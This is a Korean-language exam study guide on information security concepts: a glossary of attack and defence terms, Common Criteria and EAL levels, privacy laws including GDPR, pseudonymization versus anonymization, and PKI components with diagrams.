| Stuxnet | 2010년 이란 나탄즈 핵시설 원심분리기를 파괴한 악성코드, 국가 기반시설을 노린 최초의 국가 단위 사이버 무기 사례, Windows 제로데이 4개 동시 악용, 미국·이스라엘 공동 작전이라는 분석 |
| APT | 특정 대상을 노리고 오랜 기간 은밀히 침투하는 고도화된 공격, 주로 국가 지원 해커 그룹이 수행 |
| EDR | 단말(PC·서버) 행위를 실시간 분석해 악성 행위를 탐지·대응하는 보안 솔루션 |
| 네트워크 세그먼테이션 | 내부망을 여러 구역으로 나눠 침해 범위를 제한하는 보안 구조 |
| 제로트러스트(Zero Trust) | 내부망이라도 신뢰하지 않고 모든 접근을 검증하는 보안 원칙 |
| PoC(Proof of Concept) | 취약점을 실제로 공격할 수 있음을 보여 주는 샘플 코드, 패치와 함께 공개되는 경우가 많아 1-day 공격 급증 |
| 스캐닝 봇 | 취약 서버를 자동으로 찾아다니는 공격 프로그램, 패치 공개 후 24시간 안에 전 세계 취약 서버 탐색 |
| SLA | 서비스 품질 기준을 수치로 약속한 계약, 보안에서는 "Critical 패치는 24시간 내 적용" 같은 패치 응답 시간 기준 |
| WAF | 웹 방화벽, HTTP 요청을 분석해 SQL Injection·XSS 같은 웹 공격 차단, 패치 전 임시 방어선 |
| EOL(End-of-Life) | 제조사가 보안 업데이트를 더 이상 주지 않는 지원 종료 상태, 새 취약점에도 공식 패치 없음 |
| 횡적 이동(Lateral Movement) | 침해된 시스템에서 같은 내부망의 다른 시스템으로 침투 범위를 넓히는 행위 |

## 보안 인증 제도·개인정보 (CC·EAL·GDPR·가명화)
출제: 없음

### 개념
「보안 관리」 묶음의 정보보호 5축 가운데 남은 두 축, 제품 평가 기준(CC, EAL)과 법·제도(개인정보 보호 법, 가명화·익명화)를 여기서 본다.

### CC와 EAL
**CC(Common Criteria, ISO/IEC 15408)**는 보안 제품과 시스템의 보안성을 국제 공통으로 평가·인증하는 기준이다. 조직 전체의 관리체계를 평가하는 ISMS와 달리, 개별 제품(방화벽·스마트카드·DB 암호화 솔루션 등)의 보안 강도를 평가한다.

**EAL(Evaluation Assurance Level)**은 CC 평가의 보증 등급이다. 제품이 얼마나 엄격하게 검증되었는지를 수준별로 나타낸다.

| 등급 | 의미 |
|---|---|
| EAL1 | 기능적으로 시험됨 (Functionally Tested) |
| EAL2 | 구조적으로 시험됨 |
| EAL3 | 방법론적으로 시험 및 점검됨 |
| EAL4 | 방법론적으로 설계·시험·점검됨 (상용 제품 일반 등급) |
| EAL5 | 준정형화된 설계 및 시험 |
| EAL6 | 준정형화된 검증된 설계 및 시험 |
| EAL7 | 정형화된 검증된 설계 및 시험 (최고 등급) |

숫자가 높을수록 엄격하다. EAL4가 상용 제품이 받는 일반적인 상한선이고, EAL5 이상은 주로 군사·정부용 고신뢰 시스템에서 요구한다.

### 개인정보 보호 법·표준

| 법·표준 | 국가 | 핵심 내용 |
|---|---|---|
| 개인정보보호법 | 대한민국 | 모든 분야의 개인정보 처리 기본법 (2011 제정, 2020 데이터 3법 개정) |
| 정보통신망법 | 대한민국 | 정보통신서비스 제공자의 개인정보 보호 의무 (과거 분리, 현재 일부 조항만) |
| GDPR | EU | EU 일반 개인정보 보호법 (2018 시행), 역외 적용, 최대 과징금 연매출 4% |
| CCPA | 미국 캘리포니아 | 소비자 개인정보 보호법 (2020 시행) |

#### 공통 원칙
법마다 표현은 달라도 다음 원칙은 같다.

- **수집 최소화**: 꼭 필요한 정보만 수집
- **목적 제한**: 수집할 때 알린 목적 외 이용 금지
- **동의 기반**: 정보주체의 명확한 동의 필수
- **정확성**: 최신·정확한 상태 유지
- **안전성**: 유출·훼손 방지 조치 의무
- **파기**: 목적 달성 후 지체 없이 파기
- **정보주체 권리**: 열람·정정·삭제·처리정지 요구 가능

#### GDPR 고유 개념
- Data Controller(개인정보처리자)와 Data Processor(개인정보취급자) 역할 구분
- DPO(Data Protection Officer) 지정 의무
- **데이터 이동권(Right to data portability)**: 내 데이터를 다른 서비스로 옮길 권리
- **잊힐 권리(Right to be forgotten)**: 정보주체가 자기 정보 삭제를 요구할 권리

### 가명화와 익명화
개인정보를 연구·통계·AI 학습에 쓰려면 신원을 알아볼 수 없게 가공하는 비식별 조치가 필요하다. 가공 방식에 따라 가명화와 익명화로 나뉘고, 법적 취급도 다르다.

| 구분 | 가명화 (Pseudonymization) | 익명화 (Anonymization) |
|---|---|---|
| 복원 가능성 | 추가 정보를 쓰면 복원 가능 | 복원 불가 (영구 비식별) |
| 법적 취급 | 여전히 개인정보 (추가 보호 필요) | 개인정보 아님 (자유롭게 활용 가능) |
| 용도 | 통계·연구를 위한 가공 후 내부 활용 | 공개 데이터셋 배포 |
| 예시 | 홍길동 → 사용자_A001 (매핑 표 별도 보관) | 홍길동, 35세 → 30대 남성 |

```mermaid
제목: 가명화는 자물쇠로 잠근 매핑표, 익명화는 분쇄기로 폐기한 매핑표
%% 폰: TB / LR
flowchart LR
  subgraph AN["익명화 (Anonymization): 복원 불가"]
    direction LR
    A1("홍길동, 35세") --> A2("30대 남성")
    A3("매핑표 → 분쇄")
  end
  subgraph PS["가명화 (Pseudonymization): 복원 가능"]
    direction LR
    P1("홍길동") --> P2("사용자_A001")
    P3("매핑표 → 잠긴 서랍에 보관")
  end
```

#### 주요 기법
- **가명처리**: 이름·ID를 식별 불가한 값으로 치환 (위 예시의 사용자_A001)
- **총계처리(Aggregation)**: 개별 값 대신 합계·평균만 공개 (예: 전체 평균 연봉)
- **데이터 삭제**: 식별 가능 속성 자체를 제거
- **데이터 범주화**: 구체값을 범위로 변환 (35세 → 30대)
- **데이터 마스킹**: 일부를 *로 가림 (010-1234-5678 → 010-****-5678)

여기서 주의할 점이 하나 있다. 가명정보는 여전히 개인정보라는 것이다. 가명화된 정보라도 '추가 정보'만 있으면 특정 개인을 알아볼 수 있으니 법적으로는 개인정보로 분류된다. 그래서 가명정보를 처리할 때도 안전성 확보 조치(암호화·접근통제·추가 정보 별도 보관 등)가 필요하다.

## PKI·전자서명 (CA·RA·인증서·CRL)
출제: 없음

### 개념
공개키를 받았다고 해서 그 키가 정말 그 사람의 것인지는 따로 믿을 근거가 있어야 한다. **PKI(Public Key Infrastructure, 공개키 기반 구조)**는 그 공개키가 정말 그 사람의 것인지 보증하기 위해 인증서를 발급·관리하는 체계다.

**전자서명**은 송신자가 자기 개인키로 서명하고, 수신자가 송신자의 공개키로 검증하는 방식이다. 개인키는 송신자만 가지고 있으므로 서명으로 누가 보냈는지 확인되고(인증), 송신자는 나중에 보낸 사실을 부정할 수 없다(부인 방지). 서명은 원문 대신 원문의 해시값에 하므로, 내용이 바뀌면 검증이 실패해 변조도 드러난다(무결성). 그런데 여기서 헷갈리기 쉬운 게 기밀성이다. 서명은 내용을 숨기지는 않으므로 기밀성은 제공하지 않는다.

### 한눈에 구분
| 구성 요소 | 하는 일 | 헷갈리는 것 → 가르는 법 |
|---|---|---|
| **CA(인증 기관)** | 인증서를 발급·서명·폐기하는 신뢰의 중심 |  |
| **RA(등록 기관)** | 사용자 신원을 확인하고 등록을 대행 | CA와 헷갈림 → 신원 확인·등록 대행이면 RA, CA 업무를 나눠 맡음 |
| **인증서(X.509)** | 공개키와 그 소유자를 묶어 CA가 서명한 표준 전자 문서 |  |
| **CRL** | 유효 기간 전에 폐기된 인증서 목록 | OCSP와 헷갈림 → 폐기 목록이면 CRL, 실시간 조회 방식은 OCSP |

### PKI 구성 요소 하나씩 보기
은행 사이트에 접속하고 공동인증서를 발급받는 장면으로 네 구성 요소를 차례로 본다. 네 구성 요소가 이어지는 순서는 아래 그림과 같다.

```mermaid
제목: RA가 신원을 확인하면 CA가 인증서에 서명해 발급하고, 검증하는 쪽은 CA 공개키로 서명을 확인하고 CRL로 폐기 여부를 본다
%% 폰: TB
flowchart LR
  U("사용자") -->|"신원 확인"| RA("RA")
  RA -->|"등록 대행"| CA("CA")
  CA -->|"발급·서명"| C("인증서<br>X.509")
  C -->|"CA 공개키로<br>서명 검증"| V("검증하는 쪽")
  CA -.->|"폐기 목록"| L("CRL")
  L -.->|"폐기 여부 확인"| V
```

#### 1. CA (Certificate Authority, 인증 기관)
- 인증서 발급·서명·폐기
- PKI 신뢰의 중심

> 예: 은행 사이트에 접속하면 사이트가 인증서를 보여 준다. 브라우저는 인증서에 붙은 CA의 서명을, 미리 믿기로 한 CA의 공개키로 검증한 뒤에야 그 사이트의 공개키를 믿는다.

PKI에서 "이 공개키는 정말 이 주인의 것"이라고 보증하는 쪽이 CA다.

#### 2. RA (Registration Authority, 등록 기관)
- 사용자 신원 확인과 등록 대행
- CA 업무 분담

> 예: 공동인증서를 처음 발급받을 때 은행 창구나 앱에서 본인 확인을 거친다. 이때 신원을 확인하고 등록을 대행하는 쪽이 RA 역할이고, 실제 인증서 발급과 서명은 CA가 한다.

신원 확인까지가 RA, 인증서에 서명하는 것은 CA다.

#### 3. 인증서 (X.509)
- 공개키와 그 소유자를 묶어 CA가 서명한 표준 전자 문서

> 예: 인증서 안에는 소유자 이름, 그 소유자의 공개키, 유효 기간, 발급한 CA가 적혀 있고, 이 전체에 CA가 서명해 둔다. 내용을 한 글자만 바꿔도 서명 검증이 실패한다.

위 개념에서 말한 "그 키가 정말 그 사람의 것인지"에 대한 답이 바로 이 문서다.

#### 4. CRL (Certificate Revocation List)
- 유효 기간 전에 폐기된 인증서 목록
- 실시간 조회 방식은 OCSP

> 예: 개인키가 유출되면 유효 기간이 남아 있어도 그 인증서는 더 이상 믿을 수 없다. CA는 이런 인증서를 CRL에 올리고, 검증하는 쪽은 목록을 받아 확인한다. 목록을 통째로 받지 않고 인증서 하나의 상태를 그때그때 물어보는 방식이 OCSP다.

CRL은 목록을 내려받는 방식, OCSP는 실시간으로 묻는 방식이다.

정리하자면 암호화는 수신자의 공개키로 잠그고, 전자서명은 송신자의 개인키로 서명한다. 문제에서는 누구의 어떤 키를 쓰는지가 단서가 된다.
